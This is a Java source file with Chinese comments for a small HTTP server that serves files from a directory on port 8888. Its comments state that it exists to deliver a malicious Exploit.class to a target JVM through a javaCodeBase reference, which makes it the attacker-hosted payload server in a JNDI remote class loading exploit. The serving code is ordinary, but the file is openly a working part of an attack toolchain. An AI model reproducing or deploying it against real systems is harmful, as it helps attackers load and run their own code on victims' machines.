import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * HTTP 静态文件服务器（JDK 内置的 com.sun.net.httpserver 来实现）
 *
 * 职责就是：把恶意类Exploit.class 通过 HTTP 提供给目标 JVM 下载（javaCodeBase 指向这里）
 */
public class HttpFileServer {

    /**
     * 启动 HTTP 服务器
     *
     * @param directory 服务目录（恶意类所在目录）
     * @param port      监听端口（8888）
     */
    public static HttpServer start(String directory, int port) throws IOException {
        Path root = Paths.get(directory).toAbsolutePath().normalize();
        HttpServer server = HttpServer.create(new InetSocketAddress(port), 0);
        server.createContext("/", exchange -> handle(exchange, root));
        // daemon 线程：不阻塞 JVM 退出
        ExecutorService pool = Executors.newCachedThreadPool(r -> {
            Thread t = new Thread(r);
            t.setDaemon(true);
            return t;
        });
        server.setExecutor(pool);
        server.start();
        System.out.println("[*] HTTP server on 0.0.0.0:" + port + " serving " + root);
        return server;
    }

     //GET 之外的请求一律是 405 
    private static void handle(HttpExchange ex, Path root) throws IOException {
        String method = ex.getRequestMethod();
        if (!"GET".equals(method)) {
            ex.sendResponseHeaders(405, -1);
            ex.close();
            return;
        }
        String path = ex.getRequestURI().getPath();          // Exploit.class
        Path file = root.resolve(path.substring(1)).normalize();  // 去掉 '/'
        if (!file.startsWith(root) || !Files.isRegularFile(file)) {
            ex.sendResponseHeaders(404, -1);                 // -1: 说明没有响应体
            ex.close();
            return;
        }
        byte[] data = Files.readAllBytes(file);
        ex.getResponseHeaders().set("Content-Type", "application/octet-stream");
        ex.sendResponseHeaders(200, data.length);
        ex.getResponseBody().write(data);
        System.out.println("[http] GET " + path + " -> 200 (" + data.length + " bytes)");
        ex.close();
    }

    public static void main(String[] args) throws Exception {
        String dir = args.length > 0 ? args[0] : ".";
        int port = args.length > 1 ? Integer.parseInt(args[1]) : 8888;
        start(dir, port);
    }
}
